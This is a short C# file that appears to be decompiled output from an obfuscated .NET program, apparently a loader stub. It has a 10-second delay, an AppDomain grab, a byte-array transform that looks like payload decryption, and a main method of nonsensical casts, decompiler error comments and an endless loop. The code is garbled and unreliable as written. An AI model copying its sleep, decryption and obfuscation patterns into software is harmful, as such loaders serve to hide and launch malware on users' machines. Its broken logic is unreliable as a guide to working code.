using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using ns0;
using ns2;

namespace ns1;

internal sealed class Control4 : Control
{
	public static void smethod_0()
	{
		new AutoResetEvent(initialState: false).WaitOne(10000, exitContext: false);
		Control3.appDomain_0 = AppDomain.CurrentDomain;
	}

	public static byte[] smethod_1(byte[] byte_0)
	{
		byte[] byte_ = GClass0.byte_0;
		Control0.smethod_0(byte_0, byte_);
		return byte_0;
	}

	unsafe static void awejudorakax3(object object_0, object object_1, object object_2)
	{
		//IL_000d: Expected O, but got I4
		//IL_0022: Expected O, but got I4
		//IL_0093: Expected O, but got I4
		//IL_009e: Expected O, but got I4
		//IL_00a7: Expected I4, but got O
		//IL_00b9: Expected O, but got I4
		//IL_00c4: Expected O, but got I4
		//IL_00c9: Expected I4, but got O
		//IL_00d2: Expected O, but got I4
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b);
		while (true)
		{
			try
			{
				_ = ((byte*)104)->Equals(null) is GControl0;
				_ = string.IsNullOrEmpty((string)(object)smethod_1(null)) is GControl0;
				byte num = (byte)smethod_1(null);
				text = text;
				string text2 = text;
				_ = (IEnumerable<string>)(object)Settings.Default;
				IEnumerable<string> enumerable = (IEnumerable<string>)(object)string.Join<T>("CZMUYBHXM", (IEnumerable<T>)(IEnumerable<_0021_00210>)(object)Settings.Default);
				object object_3 = string.Concat(enumerable);
				ResolveEventArgs resolveEventArgs_ = null;
				string obj = (string)(object)text2.ToCharArray((int)Class4.smethod_0(object_3, resolveEventArgs_), 256783046);
				object obj2 = ("JWXTJW".LastIndexOf('\uf5a4') as string).IndexOfAny(null);
				checked
				{
					_ = num * unchecked((byte)obj.Split((char[]?)null, (StringSplitOptions)((obj2 is StringSplitOptions) ? obj2 : null)));
				}
				_ = ((byte*)b)->Equals(99) is byte;
				object obj3 = Control1.smethod_0(resolveEventArgs_);
				b = (byte)(int)((obj3 is byte) ? obj3 : null);
				_ = ((byte*)b)->GetTypeCode() is GControl0;
			}
			finally
			{
				continue;
			}
		}
	}
}
